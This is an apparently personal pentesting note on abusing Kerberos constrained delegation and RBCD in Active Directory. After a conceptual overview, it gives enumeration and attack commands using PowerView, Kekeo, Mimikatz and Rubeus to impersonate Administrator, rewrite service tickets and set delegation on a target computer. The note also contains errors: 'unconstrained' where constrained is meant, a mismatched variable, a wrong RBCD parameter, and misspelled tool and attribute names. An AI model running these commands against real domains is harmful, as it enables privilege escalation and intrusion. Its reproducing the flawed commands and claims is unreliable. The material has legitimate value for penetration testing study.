#kekeo #mimikatz #powershell 
- [Unconstrained Delegation](Unconstrained%20Delegation.md) is dangerous, as it allows services to impersonate user and access any service.
- S4U restricts this and only allows delegation to certain services.
	- Service for User to Proxy (S4U2Proxy)
	- Service for User to Self (S4U2Self)
- No TGT is required in this extention.
### S4U2Self
- Kerberos delegation when the client does not support Kerberos protocol. (Protocol Transition)
- In this scenario, the service which has the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag set, can request a TGS for the another service for the user. 
### S4U2Proxy
This extension allows a service to request another service on behalf of the user by using `ST` instead of `TGT`.
The service can only ask for impersonation `ST` for certain services defined in one of the following ways:
- **Classic Constrained Delegation**: `msDS-AllowedToDelegateTo` attribute of the service account. It contains [SPN](../AD%20Basics/Services.md) of the services for which the service account can ask ST for. To edit this parameter, `SeEnableDelegationPrivilege` priv is required.
- **Resource Based Constrained Delegation**: The service account is mentioned in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the target service for which the service account will ask ST for.
---
Constrained Delegation works in one of the two ways:
- S4U2Proxy (`TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION`) + S4U2Self (Classic Constrained Delegation) (`msDS-AllowedToDelegateTo`)
	- The compromised user/machine account should have the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` in the UAC, and the service for delegation should be mentioned in the `msDS-AllowedToDelegateTo` attribute of the compromised user/machine.
- S4U2Self (Resource Based Constrained Delegation) (`msDS-AllowedToActOnBehalfOfOtherIdentity`)
	- This moves the delegation authority to the the service/resource owner, instead of the administrator. Or in fact any user, having `Full` or `GenericWrite` over the target service.
	- The service account that can request ST should be mentioned in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the delegated service's service account.
# Exploitation
## Classic Constrained Delegation
Classing Constrained Delegation involves compromising a account with `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` and some SPNs in `msDS-AllowedToDelegateTo` attribute. We can simply tell the compromised user/computer account to ask for ST for the service mentioned in the `msDS-AllowedToDelegateTo`.
### Enumeration
- Enumerating users and computers which constrained delegation enabled using
- Powerview:
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```
- Active Directory Module
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDeleagateTo
```
- Kekeo
```powershell
kekeo tgt::ask /user:svcIIS /domain:mydomain.local /password:Qwer1234.
# this will save the TGT file to the disk
# use this TGT to request TGS for the delegated service
kekeo tgs::s4u /tgt:<tgt_file> /user:<user_to_inpersonate> /service:<service_allowed_to_delegate_to>
# this will save the TGS to the disk
# we can load this ticket it memory
mimikatz kerberos::ptt <ticket_file>
```
- Rubeus
```powershell
# This will use the TGT of websvc to ask for ST of impersonator user to access the msdss delegated service, and inject the ticket in memory
.\rubues.exe s4u /user:<username> /aes256:<aesKey> /impersonateuser:Aministrator /msdsspn:CIFS/sqlserver.domain.local /ptt
```
> unconstrained delegation performs no validation for the service mentioned in the `msDS-AllowedToDelegateTo`, hence, we can request the ST for the intended service and modify the ticket for another service. We can the add the `/altservice:<protocol>` to rubeus to modify the service ticket. Hence, the below command will request ST for the `msdsspn` account and modify the service.
```powershell
.\rubues.exe s4u /user:<username> /aes256:<aesKey> /impersonateuser:Aministrator /msdsspn:CIFS/sqlserver.domain.local /ptt /altservice:ldap
```
## RBCD
RBCD exploitation Involves having write access to an object that we want to exploit.
- Set up RBCD attribute on the target service.
- Using AD Module
```powershell
# We should already have local admin access on the computer1 account.
$compputers = "mycomputer$";
Set-ADComputer -Identity targetcomputer -PrincipalsAllowedToDelegateTo $computers;
```
- Powerview
```powershell
# Set RBCD delegation
Set-DomainRBCD -Identity targetcomputer -DelegateFrom 'mycomputer$';
# We can verify the same using
Get-DomainRBCD
```
- We can now use the same s4u module from rubeus to impersonate a user
```powershell
.\rubues.exe s4u /user:<username> /aes256:<aesKey> /impersonateuser:Aministrator /msdsspn:CIFS/sqlserver.domain.local /ptt
```
